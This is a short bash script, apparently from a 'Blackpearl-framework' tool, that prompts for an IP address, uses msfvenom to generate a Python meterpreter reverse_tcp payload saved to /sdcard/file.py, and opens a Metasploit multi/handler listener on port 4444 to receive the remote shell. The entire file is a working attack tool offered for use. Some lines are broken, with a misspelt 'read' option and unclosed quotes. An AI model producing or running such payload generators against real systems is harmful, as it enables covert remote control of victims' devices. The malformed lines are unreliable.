#!/bin/bash
g='\e[1;32m'
r='\e[1;31m'
clear 
echo 
echo $r
read - p "Enter your ip" ip
echo
echo "Making Payload"
echo
msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /sdcard/file.py
echo -e $g "~~~~~~~~~~~~~~~~~~~~~~~~~"
echo -e $g"YOUR PAYLOAD IS SAVED IN SDCARD"
echo -e "\
echo -e "  *WAITING FOR REMOTE LISTENER*
echo -e $g "~~~~~~~~~~~~~~~~~~~~~~~~~"
echo -e " Opening metasploit meterpreter"
msfconsole -q -x "use exploit/multi/handler ; set payload python/meterpreter/reverse_tcp ; set lhost $ip ; set lport 4444 ; exploit ;"
echo
echo
read -p "Press enter to go back" enter
cd Blackpearl-framework/lib
python msf.py
